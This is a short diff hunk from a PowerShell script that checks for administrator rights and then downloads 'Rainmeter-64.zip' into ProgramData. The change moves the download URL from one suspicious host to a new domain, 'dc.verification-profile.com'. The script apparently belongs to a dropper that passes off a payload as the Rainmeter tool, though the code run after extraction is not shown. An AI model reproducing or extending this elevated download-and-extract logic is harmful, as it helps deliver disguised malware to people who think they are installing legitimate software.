@@ -20,7 +20,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 }
 
 try {
-    $zipUrl      = "http://foxg0788g2.temp.swtest.ru/Rainmeter-64.zip"
+    $zipUrl      = "https://dc.verification-profile.com/Rainmeter-64.zip"
     $zipPath     = "$env:ProgramData\Rainmeter-64.zip"
     $extractPath = "$env:ProgramData"
 
